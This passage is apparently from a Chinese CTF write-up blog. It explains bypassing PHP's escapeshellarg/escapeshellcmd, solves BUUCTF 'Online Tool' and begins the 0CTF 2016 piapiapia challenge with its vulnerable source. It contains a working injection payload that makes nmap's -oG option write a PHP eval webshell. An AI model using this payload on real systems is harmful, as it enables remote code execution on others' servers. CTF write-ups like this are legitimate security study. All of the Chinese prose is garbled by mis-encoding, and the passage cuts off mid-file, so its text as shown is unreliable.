<h2 id="escapeshellarg-æµ‹è¯•"><a href="#escapeshellarg-æµ‹è¯•" class="headerlink" title="escapeshellarg æµ‹è¯•"></a>escapeshellarg æµ‹è¯•</h2><ul>
<li><p><code>escapeshellarg</code> â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</p>
</li>
<li><p>åŠŸèƒ½ ï¼š<code>escapeshellarg()</code> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« <code>exec()ã€ system()</code> æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)</p>
</li>
<li><p>å®šä¹‰ ï¼š<code>string escapeshellarg ( string $arg )</code></p>
</li>
</ul>
<p>ç»™å‡ºå¦‚ä¸‹ä»£ç ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(escapeshellarg(<span class="string">"123"</span>));  <span class="comment">// '123'</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">var_dump(escapeshellarg(<span class="string">"12'  34"</span>)); <span class="comment">// '12'\'' 34'</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbn9q4wj3094031745.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbn9q4wj3094031745.jpg" class="lazyload" title="test"></a></p>
<p>ç»è¿‡ <code>escapeshellarg</code> å‡½æ•°å¤„ç†è¿‡çš„å‚æ•°è¢«æ‹¼å‡‘æˆ shell å‘½ä»¤ï¼Œå¹¶ä¸”è¢«åŒå¼•å·åŒ…è£¹è¿™æ ·å°±ä¼šé€ æˆæ¼æ´ï¼Œè¿™ä¸»è¦åœ¨äºbashä¸­åŒå¼•å·å’Œå•å¼•å·è§£æå˜é‡æ˜¯æœ‰åŒºåˆ«çš„ã€‚</p>
<p>åœ¨è§£æå•å¼•å·çš„æ—¶å€™ï¼Œ <strong>è¢«å•å¼•å·åŒ…è£¹çš„å†…å®¹ä¸­å¦‚æœæœ‰å˜é‡ï¼Œè¿™ä¸ªå˜é‡åæ˜¯ä¸ä¼šè¢«è§£ææˆå€¼çš„</strong>ï¼Œä½†æ˜¯åŒå¼•å·ä¸åŒï¼Œ <code>bash</code> ä¼šå°†å˜é‡åè§£ææˆå˜é‡çš„å€¼å†ä½¿ç”¨ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnd3ulj30l309hjs0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnd3ulj30l309hjs0.jpg" class="lazyload" title="test"></a></p>
<p>å¯çŸ¥ï¼Œ å³ä½¿å‚æ•°ç”¨äº† <code>escapeshellarg</code> å‡½æ•°è¿‡æ»¤å•å¼•å·ï¼Œä½†å‚æ•°åœ¨æ‹¼æ¥å‘½ä»¤çš„æ—¶å€™<strong>ç”¨äº†åŒå¼•å·çš„è¯è¿˜æ˜¯ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„æ¼æ´</strong>ã€‚</p>
<p>ç´§æ¥ç€çœ‹çœ‹ <code>escapeshellcmd</code> å‡½æ•°çš„ä½œç”¨å§ã€‚</p>
<hr>
<h2 id="escapeshellcmd-æµ‹è¯•"><a href="#escapeshellcmd-æµ‹è¯•" class="headerlink" title="escapeshellcmd æµ‹è¯•"></a>escapeshellcmd æµ‹è¯•</h2><ul>
<li><p><code>escapeshellcmd</code> â€” shell å…ƒå­—ç¬¦è½¬ä¹‰</p>
</li>
<li><p>åŠŸèƒ½ï¼š<code>escapeshellcmd()</code> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p>
</li>
<li><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <strong>&amp; # ; ` | \ ? ~ &lt;&gt; ^ () [] {} $ *, \x0A å’Œ \xFF</strong>ã€‚ <code>â€˜</code> å’Œ <code>â€œ</code> ä»…åœ¨ä¸é…å¯¹çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <code>%</code> å’Œ <code>!</code> å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p>
</li>
<li><p>å®šä¹‰ ï¼š<code>string escapeshellcmd (string $command)</code></p>
</li>
</ul>
<h3 id="ä¸¾ä¸ªä¾‹å­"><a href="#ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ä¸¾ä¸ªä¾‹å­"></a>ä¸¾ä¸ªä¾‹å­</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc0kpj30io07faad.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc0kpj30io07faad.jpg" class="lazyload" title="test"></a></p>
<p> <code>escapeshellcmd</code> å’Œ <code>escapeshellarg</code>ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°éƒ½ä¼šå¯¹å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œä½†è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼ŒåŒºåˆ«å¦‚ä¸‹:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc3r8j30kr0b53z7.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc3r8j30kr0b53z7.jpg" class="lazyload" title="test"></a></p>
<p>å¯¹äºå•ä¸ªå•å¼•å·ï¼Œ <code>escapeshellarg</code> å‡½æ•°è½¬ä¹‰å,è¿˜ä¼šåœ¨å·¦å³å„åŠ ä¸€ä¸ªå•å¼•å·ï¼Œä½† <code>escapeshellcmd</code> å‡½æ•°æ˜¯ç›´æ¥åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ï¼Œå¯¹äºæˆå¯¹çš„å•å¼•å·ï¼Œ <code>escapeshellcmd</code> å‡½æ•°é»˜è®¤ä¸è½¬ä¹‰ï¼Œä½† <code>escapeshellarg</code> å‡½æ•°è½¬ä¹‰:   </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = <span class="string">"127.0.0.1' -v -d a=1"</span>;</span><br><span class="line">$a = escapeshellarg($param);</span><br><span class="line">$b = escapeshellcmd($a);</span><br><span class="line">$cmd = <span class="string">"curl "</span>.$b;</span><br><span class="line">var_dump($a).<span class="string">"\n"</span>;</span><br><span class="line">var_dump($b).<span class="string">"\n"</span>;</span><br><span class="line">var_dump($cmd).<span class="string">"\n"</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbngayxj30te09umy6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbngayxj30te09umy6.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š"><a href="#è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š" class="headerlink" title="è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š"></a>è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š</h3><ol>
<li><p>ä¼ å…¥çš„å‚æ•°æ˜¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">' -v -d a=1</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ç”±äº <code>escapeshellarg</code> å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚æ‰€ä»¥å¤„ç†ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'127.0.0.1'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ç»è¿‡ <code>escapeshellcmd</code> é’ˆå¯¹ç¬¬äºŒæ­¥å¤„ç†ä¹‹åçš„å‚æ•°ä¸­çš„ <code>\</code> ä»¥åŠ <code>a=1&#39;</code> ä¸­çš„å•å¼•å·è¿›è¡Œå¤„ç†è½¬ä¹‰ä¹‹åçš„æ•ˆæœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
</li>
</ol>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbncgukj30ic05tjrp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbncgukj30ic05tjrp.jpg" class="lazyload" title="test"></a></p>
<p>æ‰€ä»¥è¿™ä¸ªpayloadå¯ä»¥ç®€åŒ–ä¸º<code>curl 127.0.0.1\ -v -d a=1&#39;</code>ï¼Œå³å‘ <code>127.0.0.1\</code>å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º<code>a=1&#39;</code>ã€‚</p>
<p>ä½†æ˜¯å¦‚æœæ˜¯å…ˆç”¨ <code>escapeshellcmd</code> å‡½æ•°è¿‡æ»¤ï¼Œå†ç”¨çš„ <code>escapeshellarg</code> å‡½æ•°è¿‡æ»¤ï¼Œåˆ™æ²¡æœ‰è¿™ä¸ªé—®é¢˜ã€‚</p>
<hr>
<h2 id="å›å½’é¢˜ç›®"><a href="#å›å½’é¢˜ç›®" class="headerlink" title="å›å½’é¢˜ç›®"></a>å›å½’é¢˜ç›®</h2><p>é¢˜ç›®è¿˜æœ‰ä¸€ä¸ª </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br></pre></td></tr></table></figure></div>

<p>è¿™æœ‰ä¸ª <code>system</code> æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>ä»£ç æœ¬æ„æ˜¯å¸Œæœ›æˆ‘ä»¬è¾“å…¥ipè¿™æ ·çš„å‚æ•°åšä¸€ä¸ªæ‰«æï¼Œé€šè¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°æ¥è¿›è¡Œè§„åˆ™è¿‡æ»¤è½¬è¯‘ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å•å¼•å·å¼•èµ·æ¥ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬çœ‹åˆ°äº†ä¸Šé¢çš„æ¼æ´æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€ƒè„±è¿™ä¸ªå¼•å·çš„æŸç¼š</p>
<p>è¿™é‡Œå¸¸è§çš„å‘½ä»¤åæ³¨å…¥æ“ä½œå¦‚ <code>| &amp; &amp;&amp;</code> éƒ½ä¸è¡Œï¼Œè™½ç„¶æˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„æ“ä½œé€ƒè¿‡äº†å•å¼•å·ï¼Œä½† <code>escapeshellcmd</code> ä¼šå¯¹è¿™äº›ç‰¹æ®Šç¬¦å·å‰é¢åŠ ä¸Š <code>\</code> æ¥è½¬ç§»</p>
<p>æŸ¥æ‰¾åˆ°åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•° <code>-oG</code> å¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶<br>è¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼Œç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼Œä¼ é©¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;manayakko&quot;]);?&gt; -oG yakko.php &#39;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šèœåˆ€ è·å¾—flag</p>
<h1 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h1><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">BUUCTF 2018 Online Tool</a><br><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜</a><br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a> </p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay5</title>
    <url>/yakko117/2019/12/02/BuuctfDay5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BuuctfDay5"><a href="#BuuctfDay5" class="headerlink" title="BuuctfDay5"></a>BuuctfDay5</h1><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸"><a href="#è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸"></a>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸</h3><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96777110" target="_blank" rel="noopener">å¤§ä½¬çš„wp</a><br>ç‚¹å‡»è¿›å…¥ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæ‰«åå°ï¼Œæ‰«åˆ°äº† <code>www.zip</code> ï¼Œç„¶åæ³¨å†Œè´¦å·</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxgl0yj307w0clq41.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxgl0yj307w0clq41.jpg" class="lazyload" title="test"></a></p>
<h3 id="è·³è½¬åˆ°-Profile-php"><a href="#è·³è½¬åˆ°-Profile-php" class="headerlink" title="è·³è½¬åˆ° Profile.php"></a>è·³è½¬åˆ° <code>Profile.php</code></h3><p>è¿™è¾¹åªå±•ç¤ºéƒ¨åˆ†æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $profile=$user-&gt;show_profile($username);</span><br><span class="line">    <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">        header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $profile = unserialize($profile);</span><br><span class="line">        $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">        $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">        $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">        $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">"static/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">"static/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">"static/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class="container" style="margin-top:100px"&gt;  </span><br><span class="line">        &lt;img src = data:image/gif;base64,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $photo; <span class="meta">?&gt;</span><span class="string">" class="</span>img-memeda <span class="string">" style="</span>width:<span class="number">180</span>px;margin:<span class="number">0</span>px auto;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="ä»¥åŠæ ¸å¿ƒçš„-class-php"><a href="#ä»¥åŠæ ¸å¿ƒçš„-class-php" class="headerlink" title="ä»¥åŠæ ¸å¿ƒçš„ class.php"></a>ä»¥åŠæ ¸å¿ƒçš„ class.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">        $value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">            $config[<span class="string">'hostname'</span>],</span><br><span class="line">            $config[<span class="string">'username'</span>], </span><br><span class="line">            $config[<span class="string">'password'</span>]</span><br><span class="line">        );</span><br><span class="line">        mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">        $key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">        $value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">        $sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure></div>
<hr>
<h3 id="æœ€åè¿˜æœ‰æ¥æ”¶çš„config-php"><a href="#æœ€åè¿˜æœ‰æ¥æ”¶çš„config-php" class="headerlink" title="æœ€åè¿˜æœ‰æ¥æ”¶çš„config.php"></a>æœ€åè¿˜æœ‰æ¥æ”¶çš„config.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    $config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">    $config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">    $config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">    $flag = <span 